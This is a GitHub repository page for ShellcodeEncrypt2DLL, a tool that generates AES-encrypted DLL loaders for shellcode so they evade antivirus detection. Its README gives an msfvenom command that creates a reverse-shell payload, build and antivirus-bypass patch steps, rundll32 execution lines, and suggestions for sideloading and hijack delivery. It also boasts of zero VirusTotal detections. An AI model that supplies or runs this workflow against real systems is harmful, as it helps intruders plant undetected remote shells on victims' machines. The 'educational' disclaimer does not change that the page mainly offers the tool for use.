# https://github.com/restkhz/ShellcodeEncrypt2DLL

[Skip to content](https://github.com/restkhz/ShellcodeEncrypt2DLL#start-of-content)

You signed in with another tab or window. [Reload](https://github.com/restkhz/ShellcodeEncrypt2DLL) to refresh your session.You signed out in another tab or window. [Reload](https://github.com/restkhz/ShellcodeEncrypt2DLL) to refresh your session.You switched accounts on another tab or window. [Reload](https://github.com/restkhz/ShellcodeEncrypt2DLL) to refresh your session.Dismiss alert

{{ message }}

[restkhz](https://github.com/restkhz)/ **[ShellcodeEncrypt2DLL](https://github.com/restkhz/ShellcodeEncrypt2DLL)** Public

- [Notifications](https://github.com/login?return_to=%2Frestkhz%2FShellcodeEncrypt2DLL) You must be signed in to change notification settings
- [Fork\\
34](https://github.com/login?return_to=%2Frestkhz%2FShellcodeEncrypt2DLL)
- [Star\\
140](https://github.com/login?return_to=%2Frestkhz%2FShellcodeEncrypt2DLL)


A script to generate AV evaded(static) DLL shellcode loader with AES encryption.


[140\\
stars](https://github.com/restkhz/ShellcodeEncrypt2DLL/stargazers) [34\\
forks](https://github.com/restkhz/ShellcodeEncrypt2DLL/forks) [Branches](https://github.com/restkhz/ShellcodeEncrypt2DLL/branches) [Tags](https://github.com/restkhz/ShellcodeEncrypt2DLL/tags) [Activity](https://github.com/restkhz/ShellcodeEncrypt2DLL/activity)

[Star](https://github.com/login?return_to=%2Frestkhz%2FShellcodeEncrypt2DLL)

[Notifications](https://github.com/login?return_to=%2Frestkhz%2FShellcodeEncrypt2DLL) You must be signed in to change notification settings

# restkhz/ShellcodeEncrypt2DLL

main

[**1** Branch](https://github.com/restkhz/ShellcodeEncrypt2DLL/branches) [**0** Tags](https://github.com/restkhz/ShellcodeEncrypt2DLL/tags)

[Go to Branches page](https://github.com/restkhz/ShellcodeEncrypt2DLL/branches)[Go to Tags page](https://github.com/restkhz/ShellcodeEncrypt2DLL/tags)

Go to file

Code

Open more actions menu

## Folders and files

| Name | Name | Last commit message | Last commit date |
| --- | --- | --- | --- |
| ## Latest commit<br>[![restkhz](https://avatars.githubusercontent.com/u/20902146?v=4&size=40)](https://github.com/restkhz)[restkhz](https://github.com/restkhz/ShellcodeEncrypt2DLL/commits?author=restkhz)<br>[update](https://github.com/restkhz/ShellcodeEncrypt2DLL/commit/8c0f80b90e27202d9ca8657aa884b7f0357efb77)<br>11 months agoMar 28, 2025<br>[8c0f80b](https://github.com/restkhz/ShellcodeEncrypt2DLL/commit/8c0f80b90e27202d9ca8657aa884b7f0357efb77) · 11 months agoMar 28, 2025<br>## History<br>[4 Commits](https://github.com/restkhz/ShellcodeEncrypt2DLL/commits/main/) <br>Open commit details<br>[View commit history for this file.](https://github.com/restkhz/ShellcodeEncrypt2DLL/commits/main/) 4 Commits |
| [README.md](https://github.com/restkhz/ShellcodeEncrypt2DLL/blob/main/README.md "README.md") | [README.md](https://github.com/restkhz/ShellcodeEncrypt2DLL/blob/main/README.md "README.md") | [update](https://github.com/restkhz/ShellcodeEncrypt2DLL/commit/8c0f80b90e27202d9ca8657aa884b7f0357efb77 "update") | 11 months agoMar 28, 2025 |
| [ShellcodeEncrypt2Dll.py](https://github.com/restkhz/ShellcodeEncrypt2DLL/blob/main/ShellcodeEncrypt2Dll.py "ShellcodeEncrypt2Dll.py") | [ShellcodeEncrypt2Dll.py](https://github.com/restkhz/ShellcodeEncrypt2DLL/blob/main/ShellcodeEncrypt2Dll.py "ShellcodeEncrypt2Dll.py") | [update](https://github.com/restkhz/ShellcodeEncrypt2DLL/commit/8c0f80b90e27202d9ca8657aa884b7f0357efb77 "update") | 11 months agoMar 28, 2025 |
| [patch.py](https://github.com/restkhz/ShellcodeEncrypt2DLL/blob/main/patch.py "patch.py") | [patch.py](https://github.com/restkhz/ShellcodeEncrypt2DLL/blob/main/patch.py "patch.py") | [update](https://github.com/restkhz/ShellcodeEncrypt2DLL/commit/8c0f80b90e27202d9ca8657aa884b7f0357efb77 "update") | 11 months agoMar 28, 2025 |
| [template.cpp](https://github.com/restkhz/ShellcodeEncrypt2DLL/blob/main/template.cpp "template.cpp") | [template.cpp](https://github.com/restkhz/ShellcodeEncrypt2DLL/blob/main/template.cpp "template.cpp") | [update](https://github.com/restkhz/ShellcodeEncrypt2DLL/commit/8c0f80b90e27202d9ca8657aa884b7f0357efb77 "update") | 11 months agoMar 28, 2025 |
| View all files |

## Repository files navigation

# ShellcodeEncrypt2DLL

[Permalink: ShellcodeEncrypt2DLL](https://github.com/restkhz/ShellcodeEncrypt2DLL#shellcodeencrypt2dll)

A script to generate AV evaded(static) DLL shellcode loader with AES encryption.

Shellcode and API names encryption + Dynamic API loading

Two modes:

- non-standalone: To make an encrypted DLL **WITHOUT** KEY stored in the DLL.You can use it for sideload/rundll32 but you need to pass the key. (So even if the sample is captured, the shellcode will be still difficult to recover)
- standalone: To make an encrypted DLL **WITH** KEY stored in the DLL. You can use it for sideload/hijack or in a printnightmare-like scenario.

VT: 2/72 (13/3/2025)

VT: 3/72 (14/3/2025)

VT: 3/73 (27/3/2025)

**VT: 0/72 (28/3/2025) (after update)**

[![](https://raw.githubusercontent.com/restkhz/blogImages/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20250328_193321.png)](https://raw.githubusercontent.com/restkhz/blogImages/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20250328_193321.png)

[![](https://raw.githubusercontent.com/restkhz/blogImages/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20250313_060155.png)](https://raw.githubusercontent.com/restkhz/blogImages/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20250313_060155.png)

## Usage

[Permalink: Usage](https://github.com/restkhz/ShellcodeEncrypt2DLL#usage)

You can use this on **Kali** or other linux distributions

Dependencies:

```
pip install pycryptodome
sudo apt install mingw-w64
```

I know no one wants to memorize a bunch of arguments…
**Edit your key in the `ShellcodeEncrypt2Dll.py` first**

Example:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 x64/xor_dynamic -f raw > shellcode.raw

python ShellcodeEncrypt2Dll.py --non-standalone shellcode.raw
or
python ShellcodeEncrypt2Dll.py --standalone shellcode.raw
```

Then you will get a `loader.dll`

For a particular antivirus program, we need to patch the dll to bypass…

```
python patch.py (optional)
```

Then you will get a `loader_patched.dll`

For non-standalone:

```
rundll32 <path_to_dll>,EPoint <Your KEY>
```

You can make you own exe to load this DLL with KEY as well.

For standalone:

```
rundll32 <path_to_dll>,EPoint
```

As you see, standalone and non-standalone both have `EPoint` as export function.

Your can edit your key in the python script.

## How does it work?

[Permalink: How does it work?](https://github.com/restkhz/ShellcodeEncrypt2DLL#how-does-it-work)

This script will generate a header file for template.cpp, then try to compile with `x86_64-w64-mingw32-g++`.
The `shellcode` and `function names` like `VirtuallAlloc`, `CreateThread` etc will be encrypted(AES-CBC) with key.

Hide suspicious strings as much as possible…

Considering entropy…

The standalone mode will store the key in the DLL. Decrypt itself when running.
The non-standalone mode needs your key as a parameter to decrypt itself when running.

## Disclaimer

[Permalink: Disclaimer](https://github.com/restkhz/ShellcodeEncrypt2DLL#disclaimer)

Submitted to VirusTotal already. Only for educational purposes.

## About

A script to generate AV evaded(static) DLL shellcode loader with AES encryption.


### Resources

[Readme](https://github.com/restkhz/ShellcodeEncrypt2DLL#readme-ov-file)

### Uh oh!

There was an error while loading. [Please reload this page](https://github.com/restkhz/ShellcodeEncrypt2DLL).

[Activity](https://github.com/restkhz/ShellcodeEncrypt2DLL/activity)

### Stars

[**140**\\
stars](https://github.com/restkhz/ShellcodeEncrypt2DLL/stargazers)

### Watchers

[**1**\\
watching](https://github.com/restkhz/ShellcodeEncrypt2DLL/watchers)

### Forks

[**34**\\
forks](https://github.com/restkhz/ShellcodeEncrypt2DLL/forks)

[Report repository](https://github.com/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Frestkhz%2FShellcodeEncrypt2DLL&report=restkhz+%28user%29)

## [Releases](https://github.com/restkhz/ShellcodeEncrypt2DLL/releases)

No releases published

## [Packages\  0](https://github.com/users/restkhz/packages?repo_name=ShellcodeEncrypt2DLL)

No packages published

## Languages

- [C++64.7%](https://github.com/restkhz/ShellcodeEncrypt2DLL/search?l=c%2B%2B)
- [Python35.3%](https://github.com/restkhz/ShellcodeEncrypt2DLL/search?l=python)

You can’t perform that action at this time.